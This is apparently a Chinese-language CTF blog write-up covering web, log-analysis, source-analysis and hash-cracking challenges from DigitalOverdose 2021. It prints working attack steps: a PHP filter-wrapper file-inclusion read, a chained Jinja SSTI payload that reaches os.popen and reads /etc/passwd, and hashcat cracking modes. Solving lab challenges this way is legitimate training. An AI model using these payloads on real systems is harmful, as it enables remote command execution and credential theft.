---
title: "DigitalOverdoseCTF2021 Wp"
slug: "digitaloverdosectf2021-wp"
description: "只会做简单的题，别骂了"
date: 2021-10-22T11:54:15+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## Web/git commit -m "whatever"

> Visit the website

![image-20211009120536593](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png)

emmmm 联系这个题目 访问一下.git看看有没有备份文件泄露

![image-20211019214445911](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png)

用GitHacker下载泄露的git文件，有一个index.php

```php
<?php

/**
 * Simple sodium crypto class for PHP >= 7.2
 * @author MRK
 */
class crypto {

    /**
     *
     * @return type
     */
    static public function create_encryption_key() {
        return base64_encode(sodium_crypto_secretbox_keygen());
    }

    /**
     * Encrypt a message
     *
     * @param string $message - message to encrypt
     * @param string $key - encryption key created using create_encryption_key()
     * @return string
     */
    static function encrypt($message, $key) {
        $key_decoded = base64_decode($key);
        $nonce = random_bytes(
                SODIUM_CRYPTO_SECRETBOX_NONCEBYTES
        );

        $cipher = base64_encode(
                $nonce .
                sodium_crypto_secretbox(
                        $message, $nonce, $key_decoded
                )
        );
        sodium_memzero($message);
        sodium_memzero($key_decoded);
        return $cipher;
    }

    /**
     * Decrypt a message
     * @param string $encrypted - message encrypted with safeEncrypt()
     * @param string $key - key used for encryption
     * @return string
     */
    static function decrypt($encrypted, $key) {
        $decoded = base64_decode($encrypted);
        $key_decoded = base64_decode($key);
        if ($decoded === false) {
            throw new Exception('Decryption error : the encoding failed');
        }
        if (mb_strlen($decoded, '8bit') < (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) {
            throw new Exception('Decryption error : the message was truncated');
        }
        $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, '8bit');
        $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, '8bit');

        $plain = sodium_crypto_secretbox_open(
                $ciphertext, $nonce, $key_decoded
        );
        if ($plain === false) {
            throw new Exception('Decryption error : the message was tampered with in transit');
        }
        sodium_memzero($ciphertext);
        sodium_memzero($key_decoded);
        return $plain;
    }

}

$privatekey = "mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=";

$flag = file_get_contents('../flag.txt');

$enc = crypto::encrypt($flag, $privatekey);

echo $enc;

?>
```

包含了解密的模块，所以用它解密一下即可

————这里我的本地php一直出问题 版本7.3.4和7.4.21都报错

## Web/notrequired

> Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?

注意到链接是http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html

用伪协议看一下index.php的源码/index.php?file=php://filter/convert.base64-encode/resource=index.php

![image-20211009193402728](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png)

访问/bin/secrets.txt，得到 QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==

`BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}`

## Web/madlib

> I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!
>
> Try it out and let me know what you think! The character length limit should make this app pretty secure.

一个flask的webapp

![image-20211020005245072](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png)

先看下源码

```python
from flask import Flask, render_template_string, request, send_from_directory


app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('html', 'index.html')

@app.route('/madlib', methods=['POST'])
def madlib():
    if len(request.json) == 5:
        verb = request.json.get('verb')
        noun = request.json.get('noun')
        adjective = request.json.get('adjective')
        person = request.json.get('person')
        place = request.json.get('place')
        params = [verb, noun, adjective, person, place]
        if any(len(i) > 21 for i in params):
            return 'your words must not be longer than 21 characters!', 403
        madlib = f'To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\'t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.'
        return render_template_string(madlib)
    return 'This madlib only takes five words', 403

@app.route('/source')
def show_source():
    return send_from_directory('/app/', 'app.py')

app.run('0.0.0.0', port=1337)
```

看到了熟悉的模板渲染（语段来自于[u/masterhacker_bot](https://www.reddit.com/user/masterhacker_bot/)），只会渲染特定的位置，而且有个特殊的`{adjective}.{person}`

存在5个可以ssti的地方，但是限制每一个框字符数必须在21个之内；其中还有两个非常特殊的`{adjective}.{person}`连了起来，我们可以用这个`.`点号连接我们payload的长度

这样相当于有4个可以构造的地方，前两个用来将长长的payload用短的变量及逆行替换，第三个是payload本体，第三和第四个位置均是回显位；首先通过`config.update`方法不断地向后取值来拿到可以用的函数并将其存储在`config.a`中，之后调用它来rce

```
{%set x=config%}
{%set y=x.update%}
{{y(a=x
__class__.__init__)}}
{{config.a}}
```

回显`<function Config.__init__ at 0x7fd75dae31e0>`，现在我们设法调用函数来执行命令

```
{{y(a=x.a
__globals__['os'])}}
```

回显`<module 'os' from '/usr/local/lib/python3.6/os.py'>`

```
{{y(a=x.a
popen)}}
```

回显`<function popen at 0x7fd75ed5a730>`，此时我们的`config.a`就是`os.popen()`，现在来调用它来执行命令

```
{%set x=config%}
{%set y=x.a%}
{{y('uname -a')
read()}}
{{config.a}}
```

回显`Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux`，成功执行了命令，接下来就很简单了，读一波flag

```
{{y('cat flag.txt')
read()}}
```

`DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}`

————很幸运的是最后我们的payload正好小于21个字符，显然我们被长度限制了发挥，但是这里还有别的trick

Jinja不仅支持模板内部的变量赋值还支持`~`进行字符串的连接，再利用上`config.command`甚至能读出/etc/passwd

```
{%set x=config%}
{%set y=x.update%}
{%set p='cat /etc'%}
{%set q=p~'/passw'%}
{{y(b=q~'d')}}
```

```
{%set x=config%}
{%set y=x.a%}
{%set z=config.b%}
{{z}}
{{y(z).read()}}
```

![image-20211021172308541](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png)

参考：[Digital Overdose 2021 Autumn CTF Writeup — madlib (web)](https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260)

## Log Analysis/Part1 - Ingress

> Our website was hacked recently and the attackers completely ransomwared our server!
>
> We've recovered it now, but we don't want it to happen again.
>
> Here are the logs from before the attack, can you find out what happened?

给出了访问日志，有庞大的数据，n行~~，但是不太会看~~

在37557行出现了访问`/ywesusnz cmd%3Dcd+..`，往后还有一些ywesusnz开头的，37629行出现了`/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==`，b64解密

`DO{better_remove_that_backdoor}`

## Log Analysis/Part 2 - Investigation

> Thanks for finding the RFI vulnerability in our FAQ.  We have fixed it now, but we don't understand how the attacker found it so quickly.
>
> We suspect it might be an inside job, but maybe they got the source another way.  Here are the logs for the month prior to the attack, can you see anything suspicious?
>
> Please submit the attackers IP as the flag as follow, DO{x.x.x.x}

仍然是给出了很多行的日志

![image-20211022081303705](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png)

发现了可疑的内容`DO{45.85.1.176}` 但是提交flag错误

（然后发现是很傻逼的把200.13.84.124当作flag交了……

## Log Analysis/Part 3 - Backup Policy

> So it looks like the attacker scanned our site for old backups right?  Did he get one?

接着找，发现了/backup.zip的请求是200ok

但是交flag的时候不知道交啥，看了wp才发现藏在了UA头里

```
Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
```

将中间那一串b64解密后得到

`DO{s3cr3t___agent}`

## Source Analysis/A1 - C-nanigans

> Find the flag parts in the source code, assemble the flag, submit the flag.
>
> (This code may not compile, and it is useless to attempt to do so)

提示我们关注源码而不是编译

![image-20211022084007781](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png)

![image-20211022083958098](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png)

![image-20211022084018091](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png)

![image-20211022084123654](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png)

```
444f7b
733075526333
5f406e616c79333173
7d
```

hex解密后得到`DO{s0uRc3_@naly31s}`

## Hash Cracking/Hash 1

```
54a09c22fc0d1af44865e411ff6e8d50
```

`phantomlover`

## Hash Cracking/Hash 2

```
52ed4b109a2662fdf15edfd95632667869fc5802
```

`fishchips`

## Hash Cracking/Hash 3

```
550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
```

`mommadobbins`

## Hash Cracking/Hash 4

```
451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
```

[Hash Identifier](https://md5hashing.net/hash_type_checker)

hashcat -m 6900    ghost

`happyfamily`

## Hash Cracking/Hash 5

```
$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
```

hashcat -m 3200    bcrypt

`cowabunga`

## Hash Cracking/Hash 6

```
$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
```

[Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)

hashcat -m 500    MD5-Crypt

`scottiebanks`

## Hash Cracking/Hash 7

```
$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
```

hashcat -m 1800    sha512crypt $6$

`igetmoney`

------

很水的wp，或者说是复现，没有什么参考价值；挺有意思的题，学到了ssti的新trick；Source Analysis的剩下两个题全是web+reverse/crypto/pwn（指路wp: [Boris](https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris)  |  [I think this could be C4](https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4)），谢谢，完全看不懂，已经跪了

web狗死路一条死路一条死路一条死路一条死路一条

😅



